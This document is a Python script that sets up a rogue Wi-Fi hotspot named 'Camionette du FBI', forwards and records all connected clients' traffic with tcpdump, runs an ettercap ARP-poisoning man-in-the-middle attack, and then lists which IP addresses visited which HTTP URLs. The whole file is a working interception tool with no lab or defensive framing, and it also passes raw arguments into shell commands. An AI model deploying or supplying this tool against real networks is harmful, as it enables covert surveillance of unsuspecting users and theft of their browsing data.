#!/usr/bin/python3

import sys
import os
import subprocess
import json

print("Checking privilege...")
if os.geteuid() != 0:
	sys.exit("You need to be root to execute this script !")

print("Done !")
print("Checking arguments/interfaces...")

if len(sys.argv) < 3:
	sys.exit("Usage: ./main.py INTERFACE_EXT INTERFACE_AP")

# Check both interfaces if they exists
for i in range(1,3):
	if not os.path.exists(f"/sys/class/net/{sys.argv[i]}/"):
		print(f"{sys.argv[i]} interface not found !")
		exit()

print("Done !")
print("Setting up paquet redirection to internet...")

# Activate redirection
f = open("/proc/sys/net/ipv4/ip_forward", "w")
f.write("1")
f.close()

# Allow redirection on firewall
os.system(f"iptables -I POSTROUTING -t nat -o {sys.argv[1]} -j MASQUERADE")

print("Done !")
print("Creating config files...")

f = open("/tmp/dnsmasq.conf", "w")
f.write(f"\
interface={sys.argv[2]}\n\
dhcp-range=192.168.2.50,192.168.2.150,12h\n\
dhcp-option=6,8.8.8.8\n\
dhcp-option=3,192.168.2.1")
f.close()

# Set AP ip address
os.system(f"ip addr add 192.168.2.1/24 dev {sys.argv[2]}")

f = open("/tmp/hostapd.conf", "w")
f.write(f"\
interface={sys.argv[2]}\n\
ssid=Camionette du FBI\n\
hw_mode=g\n\
channel=6")
f.close()

print("Done !")
print("Starting hostapd and dnsmasq...")

# Killing process that could be using port 53
os.system("sudo service systemd-resolved stop")

dnsmasq_p = subprocess.Popen(["dnsmasq", "-d", "-C", "/tmp/dnsmasq.conf"], stdout=subprocess.DEVNULL)
hostapd_p = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=subprocess.DEVNULL)
tcpdump_p = subprocess.Popen(["tcpdump", "-w", "/tmp/result.pcap", "-i", sys.argv[2]])

print("Done ! You should see 'Camionette du FBI' wifi")
print("Ctrl-C when you're done...")

try:
    tcpdump_p.wait()
except KeyboardInterrupt:
    ettercap_p = subprocess.Popen(["ettercap", "-Tqi", sys.argv[2], "-M", "arp:remote", "////"])
    

try:
	#os.system(f"sudo drifnet -d ./img -i {sys.argv[2]}")
    ettercap_p.wait()
except KeyboardInterrupt:
	print("Exiting scan...")

dnsmasq_p.terminate()
hostapd_p.terminate()
tcpdump_p.terminate()

# clean
os.system("sudo service systemd-resolved restart")
os.system("iptables --flush")

print("Done !")
print("Starting analysing packets...")

os.system("tshark -r /tmp/result.pcap -T json > /tmp/result.json")
	
os.system("rm /tmp/result.pcap")

with open("/tmp/result.json", "r") as f:
	data = json.load(f)

print("\n\
########################################\n\
Scanning result :\n\
########################################\n\
")

for packet in data:

    if "http" in packet["_source"]["layers"]:

        if "http.request.full_uri" in packet["_source"]["layers"]["http"]:

            if "http.referer" not in  packet["_source"]["layers"]["http"]:
                url = packet["_source"]["layers"]["http"]["http.request.full_uri"]
                ip = packet["_source"]["layers"]["ip"]["ip.src"]

                print(f"'{ip}' visited '{url}'")

exit(0)